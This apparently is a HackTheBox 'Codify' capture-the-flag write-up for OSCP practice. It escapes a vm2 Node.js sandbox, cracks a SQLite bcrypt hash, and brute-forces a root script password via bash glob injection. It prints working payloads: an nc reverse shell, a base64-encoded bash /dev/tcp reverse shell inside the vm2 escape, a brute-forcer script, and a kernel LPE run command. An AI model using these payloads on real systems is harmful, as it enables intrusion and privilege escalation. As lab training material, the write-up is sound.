+++
date = '2026-05-15T00:00:00-03:00'
draft = false
title = 'HTB: Codify - OSCP Prep Write-up'
tags = ['htb', 'oscp', 'lain-kusanagi', 'write-up', 'linux', 'nodejs', 'vm2', 'sandbox-escape', 'sqlite', 'glob-injection', 'bash', 'brute-force', 'dirtyfrag']
description = 'Write-up for HackTheBox Codify - escaping a vm2 Node.js sandbox to get a shell, cracking a SQLite hash, and exploiting a glob injection in a bash script to brute-force the root password character by character.'
ShowToc = true
TocOpen = false
[cover]
image = 'images/htb-codify/cover.png'
+++

Sandboxes are only as strong as their implementation. Codify gives you a Node.js code editor to play with - and a vm2 version that plays right back.

## Machine info

| | |
|---|---|
| **Name** | Codify |
| **Platform** | HackTheBox |
| **OS** | Linux |
| **Difficulty** | Easy |

## TL;DR

- Web app runs Node.js snippets in a vm2 sandbox; `child_process` is blocked, but vm2's context escaping lets you break out entirely
- Shell as `svc`, linpeas finds a SQLite database with a bcrypt hash for `joshua` - cracked with John + rockyou
- SSH as joshua, `sudo -l` shows `/opt/scripts/mysql-backup.sh` as root; the script uses unquoted `[[ $DB_PASS == $USER_PASS ]]` enabling glob-based password brute-forcing
- Alternatively, compile and run the dirtyfrag LPE directly as `svc` and skip joshua entirely

---

## Recon

### Nmap

```bash
nmap -sV -sC -Pn -A codify.htb
```

![Nmap results](/images/htb-codify/nmap.png)

Ports 22 (SSH), 80 (HTTP/Apache), and 3000 (Node.js Express). Port 3000 is the interesting one.

---

## Enumeration

### The web app

![Website](/images/htb-codify/website.png)

Codify is a Node.js sandbox - you paste code and it runs in the browser. The site mentions it uses sandboxing technology with some limitations, and links to a "limitations" page. Worth checking what's blocked.

Trying the obvious route first:

```javascript
require('child_process').exec('nc -e sh 10.10.14.208 443')
```

![Child process blocked](/images/htb-codify/child-process-blocked.png)

`child_process` is not allowed. The sandbox is vm2 - a well-known Node.js sandboxing library that has had several CVEs around context escaping.

---

## Foothold

### vm2 sandbox escape

The key insight: vm2's `runInNewContext` function isolates the code, but earlier versions had a vulnerability where you could walk the prototype chain to reach the `process` object of the host Node.js runtime. Once you have `process`, you can require any module - including `child_process`.

```javascript
const vm = require('vm');
const ctx = vm.createContext({});
vm.runInNewContext(
  "this.constructor.constructor('return process')().mainModule.require('child_process').spawnSync('/bin/bash',['-c','echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yMDgvOTAwMSAwPiYxCg==|base64 -d|bash'])",
  ctx
);
```

The chain: `this` inside the context -> `.constructor` (Object) -> `.constructor` (Function) -> called with `'return process'` to get the host process object -> `.mainModule.require('child_process')` -> execute a base64-encoded bash reverse shell.

![Shell as svc](/images/htb-codify/shell-svc.png)

Shell as `svc@codify`.

### Finding the SQLite database

Linpeas flagged the `/var/www/contact/` directory:

![Contact dir](/images/htb-codify/linpeas-contact-dir.png)

There's a `tickets.db` file in there. Uploaded it to Kali for analysis:

![Tickets upload](/images/htb-codify/tickets-upload.png)

```bash
file tickets.db
```

![Tickets file](/images/htb-codify/tickets-file.png)

SQLite database. Opened it:

![SQLite dump](/images/htb-codify/sqlite-dump.png)

The `users` table has a bcrypt hash for `joshua`.

---

## Lateral Move to joshua

### Hash cracking

Saved the hash and ran John:

![Hash file](/images/htb-codify/hash-file.png)

![John running](/images/htb-codify/john-running.png)

![John cracked](/images/htb-codify/john-cracked.png)

Password: **spongebob1**.

### SSH as joshua

![SSH joshua](/images/htb-codify/ssh-joshua.png)

---

## Privilege Escalation

### sudo -l

```bash
sudo -l
```

![sudo -l](/images/htb-codify/sudo-l.png)

Joshua can run `/opt/scripts/mysql-backup.sh` as root. Time to read that script.

### mysql-backup.sh - glob injection

![mysql-backup script](/images/htb-codify/mysql-backup-script.png)

The script reads a password from the user and checks it like this:

```bash
if [[ $DB_PASS == $USER_PASS ]]; then
```

The problem: `$USER_PASS` is **not quoted** inside `[[ ]]`. In bash's `[[` construct, the right-hand side of `==` is treated as a glob pattern when unquoted. So if you enter `*`, it matches any string - including the real password.

This means we can brute-force the password character by character: test `a*`, `b*`, ..., `k*` until it matches, then test `ka*`, `kb*`, and so on. Each successful match tells us the next character. And since the script is calling the `mysql` binary, we can see the full command (including the password in plaintext) using `pspy` - but the brute-force approach is more satisfying.

I wrote a bash brute-forcer:

```bash
chars='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*'
password=''
while true; do
    found=false
    for c in $(echo $chars | fold -w1); do
        if echo "${password}${c}*" | sudo /opt/scripts/mysql-backup.sh 2>/dev/null | grep -q "Password confirmed"; then
            password="${password}${c}"
            echo "Found so far: $password"
            found=true
            break
        fi
    done
    if [ "$found" = false ]; then
        echo "Full password: $password"
        break
    fi
done
```

![Brute force output](/images/htb-codify/brute-force-output.png)

Full password recovered: `kljh12k3jhaskjh12kjh3`.

![Root shell](/images/htb-codify/root-shell.png)

**Root.**

### Alternative: dirtyfrag LPE (from svc, no joshua needed)

There's also a newer kernel LPE - dirtyfrag - that works directly from the `svc` shell, skipping the whole joshua lateral move:

```bash
gcc -O0 -Wall -o exp exp.c -lutil && ./exp
```

![Dirtyfrag root](/images/htb-codify/dirtyfrag-root.png)

Root from `svc` in one step.

---

## Takeaways

- **vm2 is not a security boundary.** Multiple sandbox escape techniques exist for vm2 - if you see it running user-supplied Node.js, check the version and look for prototype chain escapes.
- **Unquoted variables in `[[ ]]` are glob patterns.** `[[ $var == $input ]]` without quoting `$input` is a classic bash footgun. Any script doing this with a secret comparison is brute-forceable character by character.
- **SQLite databases in web app directories often hold credentials.** `/var/www/` is always worth walking when you land on a web server box.
- **Always check if a public LPE applies before spending time on a long privesc chain.** Dirtyfrag, dirty pipe, dirty cow - keep a list of recent kernel exploits and check `uname -r` early.

## References

- [HackTheBox - Codify](https://app.hackthebox.com/machines/Codify)
- [vm2 sandbox escape](https://github.com/patriksimek/vm2/issues/533)
- [dirtyfrag LPE](https://github.com/V4bel/dirtyfrag)
- Lain Kusanagi list (OSCP prep)
